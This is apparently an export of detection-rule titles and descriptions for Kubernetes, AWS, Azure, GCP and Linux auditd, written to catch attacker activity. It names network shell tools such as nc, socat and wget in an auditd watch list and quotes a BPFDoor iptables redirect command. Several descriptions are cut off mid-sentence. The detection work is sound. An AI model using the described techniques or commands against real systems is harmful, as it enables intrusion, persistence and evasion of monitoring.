rules.author: kelnage

rules.title: Kubernetes CronJob/Job Modification
rules.description:
Detects when a Kubernetes CronJob or Job is created or modified.
A Kubernetes Job creates one or more pods to accomplish a specific task, and a CronJob creates Jobs on a recurring schedule.
An adversary can take advantage of this Kubernetes object to schedule Jobs to run containers that execute malicious code within a cluster, allowing them to achieve persistence.
rules.author: kelnage

rules.title: Deployment Deleted From Kubernetes Cluster
rules.description:
Detects the removal of a deployment from a Kubernetes cluster.
This could indicate disruptive activity aiming to impact business operations.
rules.author: Leo Tsaousis (@laripping)

rules.title: Kubernetes Events Deleted
rules.description:
Detects when events are deleted in Kubernetes.
An adversary may delete Kubernetes events in an attempt to evade detection.
rules.author: Leo Tsaousis (@laripping)

rules.title: Potential Remote Command Execution In Pod Container
rules.description: Detects attempts to execute remote commands, within a Pod's container using e.g. the "kubectl exec" command.
rules.author: Leo Tsaousis (@laripping)

rules.title: Container With A hostPath Mount Created
rules.description:
Detects creation of a container with a hostPath mount.
A hostPath volume mounts a directory or a file from the node to the container.
Attackers who have permissions to create a new pod in the cluster may create one with a writable hostPath volume and chroot to escape to the underlying node.
rules.author: Leo Tsaousis (@laripping)

rules.title: Creation Of Pod In System Namespace
rules.description:
Detects deployments of pods within the kube-system namespace, which could be intended to imitate system pods.
System pods, created by controllers such as Deployments or DaemonSets have random suffixes in their names.
Attackers can use this fact and name their backdoor pods as if they were created by these controllers to avoid detection.
Deployment of such a backdoor container e.g. named kube-proxy-bv61v, could be attempted in the kube-system namespace alongside the other administrative container
rules.author: Leo Tsaousis (@laripping)

rules.title: Privileged Container Deployed
rules.description:
Detects the creation of a "privileged" container, an action which could be indicative of a threat actor mounting a container breakout attacks.
A privileged container is a container that can access the host with all of the root capabilities of the host machine. This allows it to view, interact and modify processes, network operations, IPC calls, the file system, mount points, SELinux configurations etc. as the root user on the host.
Various versions of "privileged" containers can be specified, e.
rules.author: Leo Tsaousis (@laripping)

rules.title: RBAC Permission Enumeration Attempt
rules.description:
Detects identities attempting to enumerate their Kubernetes RBAC permissions.
In the early stages of a breach, attackers will aim to list the permissions they have within the compromised environment.
In a Kubernetes cluster, this can be achieved by interacting with the API server, and querying the SelfSubjectAccessReview API via e.g. a "kubectl auth can-i --list" command.
This will enumerate the Role-Based Access Controls (RBAC) rules defining the compromised user's authorization.
rules.author: Leo Tsaousis (@laripping)

rules.title: Kubernetes Rolebinding Modification
rules.description: Detects when a Kubernetes Rolebinding is created or modified.
rules.author: kelnage

rules.title: Kubernetes Secrets Enumeration
rules.description: Detects enumeration of Kubernetes secrets.
rules.author: Leo Tsaousis (@laripping)

rules.title: Kubernetes Secrets Modified or Deleted
rules.description: Detects when Kubernetes Secrets are Modified or Deleted.
rules.author: kelnage

rules.title: New Kubernetes Service Account Created
rules.description: Detects creation of new Kubernetes service account, which could indicate an attacker's attempt to persist within a cluster.
rules.author: Leo Tsaousis (@laripping)

rules.title: Potential Sidecar Injection Into Running Deployment
rules.description:
Detects attempts to inject a sidecar container into a running deployment.
A sidecar container is an additional container within a pod, that resides alongside the main container.
One way to add containers to running resources like Deployments/DeamonSets/StatefulSets, is via a "kubectl patch" operation.
By injecting a new container within a legitimate pod, an attacker can run their code and hide their activity, instead of running their own separated pod in the cluster.
rules.author: Leo Tsaousis (@laripping)

rules.title: Kubernetes Unauthorized or Unauthenticated Access
rules.description:
Detects when a request to the Kubernetes API is rejected due to lack of authorization or due to an expired authentication token being used.
This may indicate an attacker attempting to leverage credentials they have obtained.

rules.title: AWS Bucket Deleted
rules.description:
Detects the deletion of S3 buckets in AWS CloudTrail logs.
Monitoring the deletion of S3 buckets is critical for security and data integrity, as it may indicate potential data loss or unauthorized access attempts.
rules.author: Ivan Saakov, Nasreddine Bencherchali

rules.title: AWS ConsoleLogin Failed Authentication
rules.description: Detects failed AWS console login attempts due to authentication failures. Monitoring these events is crucial for identifying potential brute-force attacks or unauthorized access attempts to AWS accounts.
rules.author: Ivan Saakov, Nasreddine Bencherchali

rules.title: AWS Successful Console Login Without MFA
rules.description:
Detects successful AWS console logins that were performed without Multi-Factor Authentication (MFA).
This alert can be used to identify potential unauthorized access attempts, as logging in without MFA can indicate compromised credentials or misconfigured security settings.
rules.author: Thuya@Hacktilizer, Ivan Saakov

rules.title: AWS CloudTrail Important Change
rules.description: Detects disabling, deleting and updating of a Trail
rules.author: vitaliy0x1

rules.title: AWS GuardDuty Detector Deleted Or Updated
rules.description:
Detects successful deletion or disabling of an AWS GuardDuty detector, possibly by an attacker trying to avoid detection of its malicious activities.
Upon deletion, GuardDuty stops monitoring the environment and all existing findings are lost.
Verify with the user identity that this activity is legitimate.

rules.author: suktech24

rules.title: Malicious Usage Of IMDS Credentials Outside Of AWS Infrastructure
rules.description:
Detects when an instance identity has taken an action that isn't inside SSM.
This can indicate that a compromised EC2 instance is being used as a pivot point.
rules.author: jamesc-grafana

rules.title: New Network ACL Entry Added
rules.description: Detects that network ACL entries have been added to a route table which could indicate that new attack vectors have been opened up in the AWS account.
rules.author: jamesc-grafana

rules.title: New Network Route Added
rules.description: Detects the addition of a new network route to a route table in AWS.
rules.author: jamesc-grafana

rules.title: PUA - AWS TruffleHog Execution
rules.description:
Detects the execution of TruffleHog, a popular open-source tool used for scanning repositories for secrets and sensitive information, within an AWS environment.
It has been reported to be used by threat actors for credential harvesting. All detections should be investigated to determine if the usage is authorized by security teams or potentially malicious.
rules.author: Swachchhanda Shrawan Poudel (Nextron Systems)

rules.title: AWS EnableRegion Command Monitoring
rules.description:
Detects the use of the EnableRegion command in AWS CloudTrail logs.
While AWS has 30+ regions, some of them are enabled by default, others must be explicitly enabled in each account separately.
There may be situations where security monitoring does not cover some new AWS regions.
Monitoring the EnableRegion command is important for identifying potential persistence mechanisms employed by adversaries, as enabling additional regions can facilitate continued access and operations within an AWS envi
rules.author: Ivan Saakov, Sergey Zelenskiy

rules.title: Ingress/Egress Security Group Modification
rules.description:
Detects when an account makes changes to the ingress or egress rules of a security group.
This can indicate that an attacker is attempting to open up new attack vectors in the account, that they are trying to exfiltrate data over the network, or that they are trying to allow machines in that VPC/Subnet to contact a C&C server.
rules.author: jamesc-grafana

rules.title: LoadBalancer Security Group Modification
rules.description:
Detects changes to the security groups associated with an Elastic Load Balancer (ELB) or Application Load Balancer (ALB).
This can indicate that a misconfiguration allowing more traffic into the system than required, or could indicate that an attacker is attempting to enable new connections into a VPC or subnet controlled by the account.
rules.author: jamesc-grafana

rules.title: RDS Database Security Group Modification
rules.description:
Detects changes to the security group entries for RDS databases.
This can indicate that a misconfiguration has occurred which potentially exposes the database to the public internet, a wider audience within the VPC or that removal of valid rules has occurred which could impact the availability of the database to legitimate services and users.
rules.author: jamesc-grafana

rules.title: Potential Malicious Usage of CloudTrail System Manager
rules.description: Detect when System Manager successfully executes commands against an instance.
rules.author: jamesc-grafana

rules.title: AWS VPC Flow Logs Deleted
rules.description:
Detects the deletion of one or more VPC Flow Logs in AWS Elastic Compute Cloud (EC2) through the DeleteFlowLogs API call.
Adversaries may delete flow logs to evade detection or remove evidence of network activity, hindering forensic investigations and visibility into malicious operations.
rules.author: Ivan Saakov

rules.title: AWS Config Disabling Channel/Recorder
rules.description: Detects AWS Config Service disabling
rules.author: vitaliy0x1

rules.title: AWS Console GetSigninToken Potential Abuse
rules.description:
Detects potentially suspicious events involving "GetSigninToken".
An adversary using the "aws_consoler" tool can leverage this console API to create temporary federated credential that help obfuscate which AWS credential is compromised (the original access key) and enables the adversary to pivot from the AWS CLI to console sessions without the need for MFA using the new access key issued in this request.
rules.author: Chester Le Bron (@123Le_Bron)

rules.title: SES Identity Has Been Deleted
rules.description: Detects an instance of an SES identity being deleted via the "DeleteIdentity" event. This may be an indicator of an adversary removing the account that carried out suspicious or malicious activities
rules.author: Janantha Marasinghe

rules.title: AWS SAML Provider Deletion Activity
rules.description:
Detects the deletion of an AWS SAML provider, potentially indicating malicious intent to disrupt administrative or security team access.
An attacker can remove the SAML provider for the information security team or a team of system administrators, to make it difficult for them to work and investigate at the time of the attack and after it.
rules.author: Ivan Saakov

rules.title: AWS S3 Bucket Versioning Disable
rules.description: Detects when S3 bucket versioning is disabled. Threat actors use this technique during AWS ransomware incidents prior to deleting S3 objects.
rules.author: Sean Johnstone | Unit 42

rules.title: AWS EC2 Disable EBS Encryption
rules.description:
Identifies disabling of default Amazon Elastic Block Store (EBS) encryption in the current region.
Disabling default encryption does not change the encryption status of your existing volumes.
rules.author: Sittikorn S

rules.title: AWS Key Pair Import Activity
rules.description: Detects the import of SSH key pairs into AWS EC2, which may indicate an attacker attempting to gain unauthorized access to instances. This activity could lead to initial access, persistence, or privilege escalation, potentially compromising sensitive data and operations.
rules.author: Ivan Saakov

rules.title: AWS EC2 Startup Shell Script Change
rules.description: Detects changes to the EC2 instance startup script. The shell script will be executed as root/SYSTEM every time the specific instances are booted up.
rules.author: faloker

rules.title: AWS EC2 VM Export Failure
rules.description: An attempt to export an AWS EC2 instance has been detected. A VM Export might indicate an attempt to extract information from an instance.
rules.author: Diogo Braz

rules.title: AWS ECS Task Definition That Queries The Credential Endpoint
rules.description:
Detects when an Elastic Container Service (ECS) Task Definition includes a command to query the credential endpoint.
This can indicate a potential adversary adding a backdoor to establish persistence or escalate privileges.
rules.author: Darin Smith

rules.title: AWS EFS Fileshare Modified or Deleted
rules.description:
Detects when a EFS Fileshare is modified or deleted.
You can't delete a file system that is in use.
If the file system has any mount targets, the adversary must first delete them, so deletion of a mount will occur before deletion of a fileshare.
rules.author: Austin Songer @austinsonger

rules.title: AWS EFS Fileshare Mount Modified or Deleted
rules.description: Detects when a EFS Fileshare Mount is modified or deleted. An adversary breaking any file system using the mount target that is being deleted, which might disrupt instances or applications using those mounts.
rules.author: Austin Songer @austinsonger

rules.title: AWS EKS Cluster Created or Deleted
rules.description: Identifies when an EKS cluster is created or deleted.
rules.author: Austin Songer

rules.title: AWS ElastiCache Security Group Created
rules.description: Detects when an ElastiCache security group has been created.
rules.author: Austin Songer @austinsonger

rules.title: AWS ElastiCache Security Group Modified or Deleted
rules.description: Identifies when an ElastiCache security group has been modified or deleted.
rules.author: Austin Songer @austinsonger

rules.title: Potential Bucket Enumeration on AWS
rules.description: Looks for potential enumeration of AWS buckets via ListBuckets.
rules.author: Christopher Peacock @securepeacock, SCYTHE @scythe_io

rules.title: AWS GuardDuty Important Change
rules.description: Detects updates of the GuardDuty list of trusted IPs, perhaps to disable security alerts against malicious IPs.
rules.author: faloker

rules.title: AWS IAM Backdoor Users Keys
rules.description:
Detects AWS API key creation for a user by another user.
Backdoored users can be used to obtain persistence in the AWS environment.
Also with this alert, you can detect a flow of AWS keys in your org.
rules.author: faloker

rules.title: AWS IAM S3Browser LoginProfile Creation
rules.description: Detects S3 Browser utility performing reconnaissance looking for existing IAM Users without a LoginProfile defined then (when found) creating a LoginProfile.
rules.author: daniel.bohannon@permiso.io (@danielhbohannon)

rules.title: AWS IAM S3Browser Templated S3 Bucket Policy Creation
rules.description: Detects S3 browser utility creating Inline IAM policy containing default S3 bucket name placeholder value of "<YOUR-BUCKET-NAME>".
rules.author: daniel.bohannon@permiso.io (@danielhbohannon)

rules.title: AWS IAM S3Browser User or AccessKey Creation
rules.description: Detects S3 Browser utility creating IAM User or AccessKey.
rules.author: daniel.bohannon@permiso.io (@danielhbohannon)

rules.title: AWS KMS Imported Key Material Usage
rules.description: Detects the import or deletion of key material in AWS KMS, which can be used as part of ransomware attacks. This activity is uncommon and provides a high certainty signal.
rules.author: toopricey

rules.title: New AWS Lambda Function URL Configuration Created
rules.description:
Detects when a user creates a Lambda function URL configuration, which could be used to expose the function to the internet and potentially allow unauthorized access to the function's IAM role for AWS API calls.
This could give an adversary access to the privileges associated with the Lambda service role that is attached to that function.
rules.author: Ivan Saakov

rules.title: AWS New Lambda Layer Attached
rules.description:
Detects when a user attached a Lambda layer to an existing Lambda function.
A malicious Lambda layer could execute arbitrary code in the context of the function's IAM role.
This would give an adversary access to resources that the function has access to.
rules.author: Austin Songer

rules.title: AWS Glue Development Endpoint Activity
rules.description: Detects possible suspicious glue development endpoint activity.
rules.author: Austin Songer @austinsonger

rules.title: AWS RDS Master Password Change
rules.description: Detects the change of database master password. It may be a part of data exfiltration.
rules.author: faloker

rules.title: Modification or Deletion of an AWS RDS Cluster
rules.description: Detects modifications to an RDS cluster or its deletion, which may indicate potential data exfiltration attempts, unauthorized access, or exposure of sensitive information.
rules.author: Ivan Saakov

rules.title: Restore Public AWS RDS Instance
rules.description: Detects the recovery of a new public database instance from a snapshot. It may be a part of data exfiltration.
rules.author: faloker

rules.title: AWS Root Credentials
rules.description: Detects AWS root account usage
rules.author: vitaliy0x1

rules.title: AWS Route 53 Domain Transfer Lock Disabled
rules.description: Detects when a transfer lock was removed from a Route 53 domain. It is recommended to refrain from performing this action unless intending to transfer the domain to a different registrar.
rules.author: Elastic, Austin Songer @austinsonger

rules.title: AWS Route 53 Domain Transferred to Another Account
rules.description: Detects when a request has been made to transfer a Route 53 domain to another AWS account.
rules.author: Elastic, Austin Songer @austinsonger

rules.title: AWS S3 Data Management Tampering
rules.description: Detects when a user tampers with S3 data management in Amazon Web Services.
rules.author: Austin Songer @austinsonger

rules.title: AWS SecurityHub Findings Evasion
rules.description: Detects the modification of the findings on SecurityHub.
rules.author: Sittikorn S

rules.title: AWS Snapshot Backup Exfiltration
rules.description: Detects the modification of an EC2 snapshot's permissions to enable access from another account
rules.author: Darin Smith

rules.title: AWS Identity Center Identity Provider Change
rules.description:
Detects a change in the AWS Identity Center (FKA AWS SSO) identity provider.
A change in identity provider allows an attacker to establish persistent access or escalate privileges via user impersonation.
rules.author: Michael McIntyre @wtfender

rules.title: AWS STS AssumeRole Misuse
rules.description: Identifies the suspicious use of AssumeRole. Attackers could move laterally and escalate privileges.
rules.author: Austin Songer @austinsonger

rules.title: AWS STS GetCallerIdentity Enumeration Via TruffleHog
rules.description:
Detects the use of TruffleHog for AWS credential validation by identifying GetCallerIdentity API calls where the userAgent indicates TruffleHog.
Threat actors leverage TruffleHog to enumerate and validate exposed AWS keys.
Successful exploitation allows threat actors to confirm the validity of compromised AWS credentials, facilitating further unauthorized access and actions within the AWS environment.
rules.author: Adan Alvarez @adanalvarez

rules.title: AWS STS GetSessionToken Misuse
rules.description: Identifies the suspicious use of GetSessionToken. Tokens could be created and used by attackers to move laterally and escalate privileges.
rules.author: Austin Songer @austinsonger

rules.title: AWS Suspicious SAML Activity
rules.description: Identifies when suspicious SAML activity has occurred in AWS. An adversary could gain backdoor access via SAML.
rules.author: Austin Songer

rules.title: AWS User Login Profile Was Modified
rules.description:
Detects activity when someone is changing passwords on behalf of other users.
An attacker with the "iam:UpdateLoginProfile" permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup.
rules.author: toffeebr33k

rules.title: Azure Active Directory Hybrid Health AD FS New Server
rules.description:
This detection uses azureactivity logs (Administrative category) to identify the creation or update of a server instance in an Azure AD Hybrid health AD FS service.
A threat actor can create a new AD Health ADFS service and create a fake server instance to spoof AD FS signing logs. There is no need to compromise an on-prem AD FS server.
This can be done programmatically via HTTP requests to Azure.
rules.author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC

rules.title: Azure Active Directory Hybrid Health AD FS Service Delete
rules.description:
This detection uses azureactivity logs (Administrative category) to identify the deletion of an Azure AD Hybrid health AD FS service instance in a tenant.
A threat actor can create a new AD Health ADFS service and create a fake server to spoof AD FS signing logs.
The health AD FS service can then be deleted after it is not longer needed via HTTP requests to Azure.
rules.author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC

rules.description:
Identifies when an admission controller is executed in Azure Kubernetes.
A Kubernetes Admission controller intercepts, and possibly modifies, requests to the Kubernetes API server.
The behavior of this admission controller is determined by an admission webhook (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys in the cluster.
An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining persistence in the cluster.

rules.title: Azure Kubernetes CronJob
rules.description:
Identifies when a Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate.
Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs.
An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.

Detects when a user has been elevated to manage all Azure Subscriptions.
This change should be investigated immediately if it isn't planned.
This setting could allow an attacker access to Azure subscriptions in your environment.

Attackers can modified the policies to Bypass MFA, weaken security thresholds, facilitate further attacks, maintain persistence.

rules.title: Multi Factor Authentication Disabled For User Account
rules.description:
Detects changes to the "StrongAuthenticationRequirement" value, where the state is set to "0" or "Disabled".
Threat actors were seen disabling multi factor authentication for users in order to maintain or achieve access to the account. Also see in SIM Swap attacks.

rules.title: Application Using Device Code Authentication Flow
rules.description:
Device code flow is an OAuth 2.0 protocol flow specifically for input constrained devices and is not used in all environments.
If this type of flow is seen in the environment and not being used in an input constrained device scenario, further investigation is warranted.
This can be a misconfigured application or potentially something malicious.
rules.author: Mark Morowczynski '@markmorow', Bailey Bercik '@baileybercik'

rules.title: Applications That Are Using ROPC Authentication Flow
rules.description:
Resource owner password credentials (ROPC) should be avoided if at all possible as this requires the user to expose their current password credentials to the application directly.
The application then uses those credentials to authenticate the user against the identity provider.
rules.author: Mark Morowczynski '@markmorow', Bailey Bercik '@baileybercik'

rules.title: Google Cloud Kubernetes Admission Controller
rules.description:
Identifies when an admission controller is executed in GCP Kubernetes.
A Kubernetes Admission controller intercepts, and possibly modifies, requests to the Kubernetes API server.
The behavior of this admission controller is determined by an admission webhook (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys in the cluster.
An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining persistence in the cluster.
For example, attackers can intercept
rules.author: Austin Songer @austinsonger

rules.title: Google Cloud Kubernetes CronJob
rules.description:
Identifies when a Google Cloud Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate.
Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs.
An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.
rules.author: Austin Songer @austinsonger

Adversaries may use binary padding to add junk data and change the on-disk representation of malware.
This rule detect using dd and truncate to add a junk data to file.
rules.author: Igor Fits, oscd.community

rules.title: Bpfdoor TCP Ports Redirect
rules.description:
All TCP traffic on particular port from attacker is routed to different port. ex. '/sbin/iptables -t nat -D PREROUTING -p tcp -s 192.168.1.1 --dport 22 -j REDIRECT --to-ports 42392'
The traffic looks like encrypted SSH communications going to TCP port 22, but in reality is being directed to the shell port once it hits the iptables rule for the attacker host only.
rules.author: Rafal Piasecki

rules.title: Linux Capabilities Discovery
rules.description: Detects attempts to discover the files with setuid/setgid capability on them. That would allow adversary to escalate their privileges.
rules.author: Pawel Mazur

rules.title: File Time Attribute Change - Linux
rules.description: Detect file time attribute change to hide new or changes to existing files.
rules.author: Igor Fits, oscd.community

rules.title: Remove Immutable File Attribute - Auditd
rules.description: Detects removing immutable file attribute.
rules.author: Jakob Weinzettl, oscd.community

rules.title: Clipboard Collection with Xclip Tool - Auditd
rules.description:
Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool.
Xclip has to be installed.
Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.
rules.author: Pawel Mazur

rules.title: Clipboard Collection of Image Data with Xclip Tool
rules.description:
Detects attempts to collect image data stored in the clipboard from users with the usage of xclip tool.
Xclip has to be installed.
Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.
rules.author: Pawel Mazur

rules.title: Possible Coin Miner CPU Priority Param
rules.description: Detects command line parameter very often used with coin miners
rules.author: Florian Roth (Nextron Systems)

rules.title: Data Compressed
rules.description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.
rules.author: Timur Zinniatullin, oscd.community

rules.title: Data Exfiltration with Wget
rules.description:
Detects attempts to post the file with the usage of wget utility.
The adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow.
rules.author: Pawel Mazur

rules.title: Overwriting the File with Dev Zero or Null
rules.description: Detects overwriting (effectively wiping/deleting) of a file.
rules.author: Jakob Weinzettl, oscd.community

rules.title: File or Folder Permissions Change
rules.description: Detects file and folder permission changes.
rules.author: Jakob Weinzettl, oscd.community

rules.title: Credentials In Files - Linux
rules.description: Detecting attempts to extract passwords with grep
rules.author: Igor Fits, oscd.community

rules.title: Hidden Files and Directories
rules.description: Detects adversary creating hidden file or directory, by detecting directories or files with . as the first character
rules.author: Pawel Mazur

rules.title: Steganography Hide Zip Information in Picture File
rules.description: Detects appending of zip file to image
rules.author: Pawel Mazur

rules.title: Masquerading as Linux Crond Process
rules.description:
Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.
Several different variations of this technique have been observed.
rules.author: Timur Zinniatullin, oscd.community

rules.title: Modify System Firewall
rules.description:
Detects the removal of system firewall rules. Adversaries may only delete or modify a specific system firewall rule to bypass controls limiting network usage or access.
Detection rules that match only on the disabling of firewalls will miss this.
rules.author: IAI

rules.title: Network Sniffing - Linux
rules.description:
Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.
An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.
rules.author: Timur Zinniatullin, oscd.community

rules.title: Screen Capture with Import Tool
rules.description:
Detects adversary creating screen capture of a desktop with Import Tool.
Highly recommended using rule on servers, due to high usage of screenshot utilities on user workstations.
ImageMagick must be installed.
rules.author: Pawel Mazur

rules.title: Screen Capture with Xwd
rules.description: Detects adversary creating screen capture of a full with xwd. Highly recommended using rule on servers, due high usage of screenshot utilities on user workstations
rules.author: Pawel Mazur

rules.title: Steganography Hide Files with Steghide
rules.description: Detects embedding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.
rules.author: Pawel Mazur

rules.title: Steganography Extract Files with Steghide
rules.description: Detects extraction of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.
rules.author: Pawel Mazur

rules.title: Suspicious Commands Linux
rules.description: Detects relevant commands often related to malware or hacking activity
rules.author: Florian Roth (Nextron Systems)

rules.title: Suspicious History File Operations - Linux
rules.description: Detects commandline operations on shell history files
rules.author: Mikhail Larin, oscd.community

rules.title: Service Reload or Start - Linux
rules.description: Detects the start, reload or restart of a service.
rules.author: Jakob Weinzettl, oscd.community, CheraghiMilad

rules.title: System Shutdown/Reboot - Linux
rules.description: Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems.
rules.author: Igor Fits, oscd.community

rules.title: Steganography Unzip Hidden Information From Picture File
rules.description: Detects extracting of zip file from image file
rules.author: Pawel Mazur

rules.title: System Owner or User Discovery - Linux
rules.description:
Detects the execution of host or user discovery utilities such as "whoami", "hostname", "id", etc.
Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
rules.author: Timur Zinniatullin, oscd.community

rules.title: Audio Capture
rules.description: Detects attempts to record audio using the arecord and ecasound utilities.
rules.author: Pawel Mazur, Milad Cheraghi

rules.title: ASLR Disabled Via Sysctl or Direct Syscall - Linux
rules.description:
Detects actions that disable Address Space Layout Randomization (ASLR) in Linux, including:
  - Use of the `personality` syscall with the ADDR_NO_RANDOMIZE flag (0x0040000)
  - Modification of the /proc/sys/kernel/randomize_va_space file
  - Execution of the `sysctl` command to set `kernel.randomize_va_space=0`
Disabling ASLR is often used by attackers during exploit development or to bypass memory protection mechanisms.
A successful use of these methods can reduce the effectiveness of ASLR and
rules.author: Milad Cheraghi

rules.title: Linux Keylogging with Pam.d
rules.description: Detect attempt to enable auditing of TTY input
rules.author: Pawel Mazur

rules.title: Password Policy Discovery - Linux
rules.description: Detects password policy discovery commands
rules.author: Ömer Günal, oscd.community, Pawel Mazur

rules.title: Suspicious C2 Activities
rules.description:
Detects suspicious activities as declared by Florian Roth in its 'Best Practice Auditd Configuration'.
This includes the detection of the following commands; wget, curl, base64, nc, netcat, ncat, ssh, socat, wireshark, rawshark, rdesktop, nmap.
These commands match a few techniques from the tactics "Command and Control", including not exhaustively the following; Application Layer Protocol (T1071), Non-Application Layer Protocol (T1095), Data Encoding (T1132)

logsource.definition:
Required auditd configuration:
-w /usr/bin/wget -p x -k susp_activity
-w /usr/bin/curl -p x -k susp_activity
-w /usr/bin/base64 -p x -k susp_activity
-w /bin/nc -p x -k susp_activity
-w /bin/netcat -p x -k susp_activity
-w /usr/bin/ncat -p x -k susp_activity
-w /usr/bin/ss -p x -k susp_activity
-w /usr/bin/netstat -p x -k susp_activity
-w /usr/bin/ssh -p x -k susp_activity
-w /usr/bin/scp -p x -k susp_activity
-w /usr/bin/sftp -p x -k susp_activity
-w /usr/bin/ftp -p x -k susp_activity
-w /usr/bin/socat -p x -k susp_activity
-w /usr/bin/wireshark -p x -k susp_activity
-w /usr/bin/tshark -p x -k susp_activity
-w /usr/bin/rawshark -p x -k susp_activity
-w /usr/bin/rdesktop -p x -k susp_activity
-w /usr/local/bin/rdesktop -p x -k susp_activity
-w /usr/bin/wlfreerdp -p x -k susp_activity
-w /usr/bin/xfreerdp -p x -k susp_activity
-w /usr/local/bin/xfreerdp -p x -k susp_activity
-w /usr/bin/nmap -p x -k susp_activity
(via https://github.com/Neo23x0/auditd/blob/ddf2603dbc985f97538d102f13b4e4446b402bae/audit.rules#L336)

rules.author: Marie Euler

rules.title: System Information Discovery - Auditd
rules.description: Detects System Information Discovery commands
rules.author: Pawel Mazur

rules.title: Auditing Configuration Changes on Linux Host
rules.description: Detect changes in auditd configuration files
rules.author: Mikhail Larin, oscd.community

rules.title: BPFDoor Abnormal Process ID or Lock File Accessed
rules.description: detects BPFDoor .lock and .pid files access in temporary file storage facility
rules.author: Rafal Piasecki

rules.title: Use Of Hidden Paths Or Files
rules.description: Detects calls to hidden files or files located in hidden directories in NIX systems.
rules.author: David Burkett, @signalblur

rules.title: Modification of ld.so.preload
rules.description: Identifies modification of ld.so.preload for shared object injection. This technique is used by attackers to load arbitrary code into processes.
rules.author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community

rules.title: Logging Configuration Changes on Linux Host
rules.description: Detect changes of syslog daemons configuration files
rules.author: Mikhail Larin, oscd.community

rules.title: Potential Abuse of Linux Magic System Request Key
rules.description:
Detects the potential abuse of the Linux Magic SysRq (System Request) key by adversaries with root or sufficient privileges
to silently manipulate or destabilize a system. By writing to /proc/sysrq-trigger, they can crash the system, kill processes,
or disrupt forensic analysis—all while bypassing standard logging. Though intended for recovery and debugging, SysRq can be
misused as a stealthy post-exploitation tool. It is controlled via /proc/sys/kernel/sysrq or permanently through /etc/sysctl.c

logsource.definition:
Required auditd configuration:
-w /proc/sysrq-trigger -p wa -k sysrq
-w /proc/sys/kernel/sysrq -p wa -k sysrq

rules.author: Milad Cheraghi

rules.title: System and Hardware Information Discovery
rules.description: Detects system information discovery commands
rules.author: Ömer Günal, oscd.community

rules.title: Systemd Service Creation
rules.description: Detects a creation of systemd services which could be used by adversaries to execute malicious code.
rules.author: Pawel Mazur

rules.title: Unix Shell Configuration Modification
rules.description: Detect unix shell configuration modification. Adversaries may establish persistence through executing malicious commands triggered when a new shell is opened.
rules.author: Peter Matkovski, IAI

rules.title: Disable System Firewall
rules.description: Detects disabling of system firewalls which could be used by adversaries to bypass controls that limit usage of the network.
rules.author: Pawel Mazur

rules.title: Clear or Disable Kernel Ring Buffer Logs via Syslog Syscall
rules.description:
Detects the use of the `syslog` syscall with action code 5 (SYSLOG_ACTION_CLEAR),
(4 is SYSLOG_ACTION_READ_CLEAR and 6 is SYSLOG_ACTION_CONSOLE_OFF) which clears the kernel
ring buffer (dmesg logs). This can be used by attackers to hide traces after exploitation
or privilege escalation. A common technique is running `dmesg -c`, which triggers this syscall internally.

logsource.definition:
Required auditd configuration:
-a always,exit -F arch=b64 -S syslog -F a0=4 -k clear_dmesg_logs
-a always,exit -F arch=b64 -S syslog -F a0=5 -k clear_dmesg_logs
-a always,exit -F arch=b64 -S syslog -F a0=6 -k disable_dmesg_logs
-a always,exit -F arch=b32 -S syslog -F a0=4 -k clear_dmesg_logs
-a always,exit -F arch=b32 -S syslog -F a0=5 -k clear_dmesg_logs
-a always,exit -F arch=b32 -S syslog -F a0=6 -k disable_dmesg_logs

rules.author: Milad Cheraghi

rules.title: Creation Of An User Account
rules.description: Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.
rules.author: Marie Euler, Pawel Mazur

rules.title: Loading of Kernel Module via Insmod
rules.description:
Detects loading of kernel modules with insmod command.
Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand.
Adversaries may use LKMs to obtain persistence within the system or elevate the privileges.
rules.author: Pawel Mazur

rules.title: Linux Network Service Scanning - Auditd
rules.description: Detects enumeration of local or remote network services.

logsource.definition: Configure these rules https://github.com/Neo23x0/auditd/blob/e181243a7c708e9d579557d6f80e0ed3d3483b89/audit.rules#L182-L183

rules.author: Alejandro Ortuno, oscd.community

rules.title: Split A File Into Pieces - Linux
rules.description: Detection use of the command "split" to split files into parts and possible transfer.
rules.author: Igor Fits, oscd.community

rules.title: System Info Discovery via Sysinfo Syscall
rules.description:
Detects use of the sysinfo system call in Linux, which provides a snapshot of key system statistics such as uptime, load averages, memory usage, and the number of running processes.
Malware or reconnaissance tools might leverage sysinfo to fingerprint the system - gathering data to determine if it's a viable target.

logsource.definition:
Required auditd configuration:
